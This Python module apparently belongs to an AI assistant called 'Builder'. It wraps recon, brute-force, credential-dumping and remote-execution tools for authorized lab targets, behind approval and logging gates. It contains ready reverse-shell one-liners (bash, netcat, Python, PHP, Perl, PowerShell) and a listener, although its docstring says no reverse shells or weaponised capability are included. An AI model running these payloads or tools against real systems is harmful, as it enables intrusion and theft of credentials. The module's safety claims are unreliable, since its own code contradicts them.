"""Authorized-lab EXECUTION — actually run recon/enumeration tools against a target the boss AUTHORIZED.

This is the only place in Builder that reaches the live network and runs external security tools, and it is
hard-gated so it can ONLY ever touch a target the boss put on record as theirs or a practice target (a CTF,
a VM they own). Every run must pass, in order:

1. ``guard_lab``      — authorized-lab mode must be ON.
2. allowlist          — the tool must be a recon/enumeration tool we recognise (no exploit frameworks, no
                        arbitrary shell).
3. argument safety    — no shell metacharacters, and no *second* host/IP/URL — so a tool can't be pointed at
                        anything other than the authorized target (which we always append ourselves).
4. ``guard_target``   — the target must match an authorization on record.
5. ``guard_action``   — the boss must approve this specific run (it reaches the network); logged either way.

Everything is written to the audit log. This is for CTFs and systems the boss owns — never anything else,
and never anything destructive. Reconnaissance and enumeration only; actual exploitation stays hands-on
(Builder guides, the boss runs it), so there is no weaponised capability bundled here.
"""

from __future__ import annotations

import re
import shutil
import subprocess
import time

from .safety import Safety

# Recon / enumeration tools only. Dual-use, but these are the standard first-phase tools for authorized
# testing — they look and list, they don't exploit. (No metasploit, no exploit kits, no reverse shells.)
TOOLS: dict[str, str] = {
    "nmap": "port & service scan",
    "gobuster": "brute-force web directories/files",
    "ffuf": "fuzz web paths/parameters",
    "dirb": "brute-force web directories",
    "feroxbuster": "brute-force web content",
    "nikto": "web server vulnerability scan",
    "whatweb": "fingerprint web technologies",
    "wpscan": "WordPress enumeration",
    "curl": "fetch a URL / inspect responses",
    "wget": "fetch a file/URL",
    "dig": "DNS lookup",
    "nslookup": "DNS lookup",
    "host": "DNS lookup",
    "whois": "domain/IP registration",
    "enum4linux": "SMB / Windows enumeration",
    "smbclient": "list/connect SMB shares",
    "smbmap": "enumerate SMB shares",
    "nbtscan": "NetBIOS scan",
    "snmpwalk": "SNMP enumeration",
    "nc": "banner grab / connect",
    "ncat": "banner grab / connect",
    "ping": "check the host is up",
    "traceroute": "trace the network path",
    # extended recon / web / AD enumeration
    "dirsearch": "brute-force web paths",
    "sslscan": "check TLS/SSL config & ciphers",
    "testssl": "deep TLS/SSL testing",
    "dnsenum": "DNS enumeration",
    "dnsrecon": "DNS reconnaissance",
    "fierce": "DNS recon",
    "sublist3r": "subdomain enumeration",
    "amass": "subdomain / attack-surface enumeration",
    "httpx": "probe web servers",
    "nuclei": "template-based vulnerability scan",
    "onesixtyone": "SNMP community scan",
    "snmp-check": "SNMP enumeration",
    "showmount": "list NFS exports",
    "rpcclient": "query MS-RPC (SMB/AD)",
    "ldapsearch": "query LDAP / Active Directory",
    "kerbrute": "enumerate/validate Kerberos users",
    "enum4linux-ng": "improved SMB / Windows enumeration",
    "cewl": "build a wordlist from a target site",
    "ssh": "connect to SSH on the target",
    "ftp": "connect to FTP on the target",
    "telnet": "connect to a service on the target",
    "mysql": "connect to MySQL on the target",
    "psql": "connect to PostgreSQL on the target",
}

# Exploitation tools that AIM AT the target (same gating as recon: target is appended, nothing else).
# Permitted only against an authorized CTF/owned target, with per-run approval and logging.
EXPLOIT_TOOLS: dict[str, str] = {
    "hydra": "brute-force a login service on the target",
    "medusa": "brute-force logins on the target",
    "sqlmap": "test/exploit SQL injection on the target",
    "wfuzz": "fuzz web requests on the target",
    "patator": "multi-protocol brute-force on the target",
    "crackmapexec": "enumerate/authenticate against the target (SMB/WinRM/…)",
    # Windows / Active Directory
    "netexec": "enumerate/authenticate across SMB/WinRM/LDAP (nxc)",
    "nxc": "netexec (SMB/WinRM/LDAP)",
    "evil-winrm": "interactive WinRM shell on the target",
    "impacket-secretsdump": "dump secrets/hashes from the target",
    "impacket-GetNPUsers": "AS-REP roasting (Kerberos)",
    "impacket-GetUserSPNs": "Kerberoasting (Kerberos)",
    "impacket-psexec": "command execution on the target (SMB)",
    "impacket-wmiexec": "command execution on the target (WMI)",
    "impacket-smbexec": "command execution on the target (SMB)",
    "impacket-mssqlclient": "connect to MSSQL on the target",
    "bloodhound-python": "collect AD data for BloodHound",
}
TOOLS.update(EXPLOIT_TOOLS)

# Tools that give you a LIVE session — run them attached to your terminal (no capture), not as a one-shot.
INTERACTIVE: set[str] = {
    "evil-winrm", "impacket-psexec", "impacket-wmiexec", "impacket-smbexec", "impacket-mssqlclient",
    "ssh", "ftp", "telnet", "mysql", "psql", "smbclient",
}

# LOCAL tools — no remote target (they search/generate/crack locally). Still lab-gated, approved and logged.
LOCAL_TOOLS: dict[str, str] = {
    "searchsploit": "search Exploit-DB (offline) for known exploits",
    "msfvenom": "generate a payload (e.g. a reverse shell) — LHOST is YOUR IP",
    "john": "crack password hashes you captured (local)",
    "hashcat": "crack password hashes you captured (local)",
    "hashid": "identify a hash type",
    "hash-identifier": "identify a hash type",
    "pypykatz": "parse LSASS / mimikatz dumps locally",
    "gpp-decrypt": "decrypt a Group Policy Preferences password",
    "stegseek": "crack/extract steghide-hidden data from a file",
    "exiftool": "read a file's metadata",
    "binwalk": "find/extract embedded data in a file",
}

# Standard reverse-shell one-liners (as published in PayloadsAllTheThings / pentestmonkey). Pure text —
# Builder generates them so you can paste one into a foothold on an AUTHORIZED box, and catch it with
# `lab listen`. {lhost}/{lport} are filled in; nothing is executed here.
REV_SHELLS: dict[str, str] = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash-udp": "sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
    "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "nc-e": "nc -e /bin/sh {lhost} {lport}",
    "python3": ("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                "s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                "os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"),
    "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": ("perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
             "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
             "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"),
    "powershell": ("powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();"
                   "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                   "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);"
                   "$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);"
                   "$s.Write($sby,0,$sby.Length);$s.Flush()}\""),
}

# Reject obvious command-injection / chaining attempts in args (we never use a shell, but be strict anyway).
_BAD_ARG = re.compile(r"[;&|`$><\n]|\$\(")
# A second host/IP/URL in the args would let a tool be aimed somewhere other than the authorized target.
_IP = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
_URL_HOST = re.compile(r"https?://([^/\s:]+)", re.I)


def tool_available(tool: str) -> bool:
    return shutil.which(tool) is not None


class LabToolError(Exception):
    """A lab tool run was rejected before it could run (bad tool, unsafe args, not installed)."""


def _check_args(args: list[str], target: str) -> None:
    """Refuse shell metacharacters and any host/IP/URL that isn't the authorized target."""
    for a in args:
        s = str(a)
        if _BAD_ARG.search(s):
            raise LabToolError(f"refused unsafe argument {s!r} (no shell metacharacters allowed).")
        for ip in _IP.findall(s):
            if ip != target:
                raise LabToolError(f"argument {s!r} names a different host ({ip}); Builder only touches the "
                                   f"authorized target {target!r}.")
        for hostpart in _URL_HOST.findall(s):
            if target not in hostpart:
                raise LabToolError(f"argument {s!r} points at {hostpart!r}, not the authorized target "
                                   f"{target!r}.")


def run_tool(cfg, db, tool: str, target: str, args: list[str] | None = None, approve=None,
             log=print, timeout: int = 420) -> dict:
    """Run one recon/enum ``tool`` against an AUTHORIZED ``target``, through every safety gate.

    ``approve(kind, detail, target) -> bool`` is asked before the (network-reaching) run. Returns
    ``{tool, target, cmd, output, seconds}``. Raises on any gate failure (lab off, target not authorized,
    tool not allowlisted, unsafe args, not approved) — Builder never runs it unless all gates pass.
    """
    args = list(args or [])
    safety = Safety(db, cfg, approver=approve, log=log)
    safety.guard_lab()                              # 1. lab mode ON (else LabModeOff)
    if tool not in TOOLS:                           # 2. allowlist
        raise LabToolError(f"{tool!r} isn't a recon/enum tool Builder will run. Allowed: "
                           f"{', '.join(sorted(TOOLS))}.")
    _check_args(args, target)                       # 3. argument safety
    safety.guard_target(target)                     # 4. target must be authorized (else TargetNotAuthorized)
    if not tool_available(tool):
        raise LabToolError(f"'{tool}' isn't installed. Install it first (e.g. on a Mac: brew install {tool}), "
                           f"then try again.")
    # The authorized target must be in the command. If the user already put it in an argument (e.g. an
    # impacket 'domain/user:pass@target' string, or 'evil-winrm -i target'), use that; otherwise append it.
    # Either way the arg-safety check above has already refused any OTHER host, so it's aimed only here.
    cmd = [tool, *args] if any(target in str(a) for a in args) else [tool, *args, target]
    safety.guard_action("offense", detail=f"{tool} {' '.join(args)}".strip(), target=target)  # 5. approval + log
    log(f"  running: {' '.join(cmd)}")
    start = time.monotonic()
    if tool in INTERACTIVE:
        # A live session (a shell, a DB/SMB client) — attach it to your terminal; don't capture.
        try:
            subprocess.run(cmd)
        except (OSError, KeyboardInterrupt):
            pass
        output = "(interactive session ended)"
    else:
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = (p.stdout or "")
            if p.stderr:
                output += ("\n[stderr]\n" + p.stderr)
        except subprocess.TimeoutExpired:
            output = f"(no result — {tool} ran longer than {timeout}s and was stopped)"
        except OSError as e:
            output = f"(couldn't run {tool}: {e})"
    db.log_safety("offense", "allowed", detail=f"{tool} {' '.join(args)}".strip(), target=target,
                  reason="authorized-lab recon/enum")
    return {"tool": tool, "target": target, "cmd": cmd, "output": output,
            "seconds": round(time.monotonic() - start, 1)}


def run_local_tool(cfg, db, tool: str, args: list[str] | None = None, approve=None, log=print,
                   timeout: int = 900) -> dict:
    """Run a LOCAL exploit helper (searchsploit, msfvenom, john, hashcat, hashid) — no remote target.

    Still hard-gated: lab mode ON, the tool on the local allowlist, no shell metacharacters, and the boss
    approves the run (it's logged). These search/generate/crack locally; they don't reach out on their own.
    """
    args = list(args or [])
    safety = Safety(db, cfg, approver=approve, log=log)
    safety.guard_lab()
    if tool not in LOCAL_TOOLS:
        raise LabToolError(f"{tool!r} isn't a local tool Builder will run. Allowed: "
                           f"{', '.join(sorted(LOCAL_TOOLS))}.")
    for a in args:
        if _BAD_ARG.search(str(a)):
            raise LabToolError(f"refused unsafe argument {a!r} (no shell metacharacters allowed).")
    if not tool_available(tool):
        raise LabToolError(f"'{tool}' isn't installed. Install it first, then try again.")
    safety.guard_action("offense", detail=f"{tool} {' '.join(args)}".strip(), target="(local)")
    cmd = [tool, *args]
    log(f"  running: {' '.join(cmd)}")
    start = time.monotonic()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = (p.stdout or "") + (("\n[stderr]\n" + p.stderr) if p.stderr else "")
    except subprocess.TimeoutExpired:
        output = f"(no result — {tool} ran longer than {timeout}s and was stopped)"
    except OSError as e:
        output = f"(couldn't run {tool}: {e})"
    db.log_safety("offense", "allowed", detail=f"{tool} {' '.join(args)}".strip(), target="(local)",
                  reason="authorized-lab local tool")
    return {"tool": tool, "cmd": cmd, "output": output, "seconds": round(time.monotonic() - start, 1)}


def make_payload(cfg, db, lhost: str, lport: int, kind: str = "bash", log=print) -> str:
    """Return a reverse-shell one-liner (pure text) to use on an authorized box. Lab-gated and logged.

    Nothing is executed — this generates the standard command you'd paste into a foothold, pointing back
    to YOUR listener (``lhost``/``lport``). Catch it with :func:`start_listener`.
    """
    safety = Safety(db, cfg, approver=None, log=log)
    safety.guard_lab()
    if kind not in REV_SHELLS:
        raise LabToolError(f"unknown payload type {kind!r}. Available: {', '.join(sorted(REV_SHELLS))}.")
    if _BAD_ARG.search(str(lhost)) or not str(lport).isdigit():
        raise LabToolError("lhost/lport look wrong — give your own IP and a numeric port.")
    payload = REV_SHELLS[kind].format(lhost=lhost, lport=int(lport))
    db.log_safety("offense", "allowed", detail=f"payload {kind} -> {lhost}:{lport}", target="(local)",
                  reason="authorized-lab reverse-shell payload generated")
    return payload


def start_listener(cfg, db, port: int, approve=None, log=print) -> None:
    """Start a netcat listener to catch a reverse shell (interactive, foreground). Lab-gated and logged.

    Blocks until a shell connects or you press Ctrl-C. A local listener — it waits for the box you're
    exploiting to connect back; it reaches out to nothing.
    """
    safety = Safety(db, cfg, approver=approve, log=log)
    safety.guard_lab()
    if not str(port).isdigit() or not (1 <= int(port) <= 65535):
        raise LabToolError("give a numeric port between 1 and 65535.")
    listener = shutil.which("ncat") or shutil.which("nc")
    if not listener:
        raise LabToolError("no netcat found. Install it first (e.g. brew install nmap  → gives 'ncat').")
    safety.guard_action("offense", detail=f"listen on {port}", target="(local listener)")
    db.log_safety("offense", "allowed", detail=f"listen on {port}", target="(local listener)",
                  reason="authorized-lab reverse-shell listener")
    log(f"  listening on 0.0.0.0:{port} — waiting for a shell (Ctrl-C to stop)…")
    try:
        subprocess.run([listener, "-lvnp", str(int(port))])   # interactive: inherits your terminal
    except KeyboardInterrupt:
        log("\n  listener stopped.")
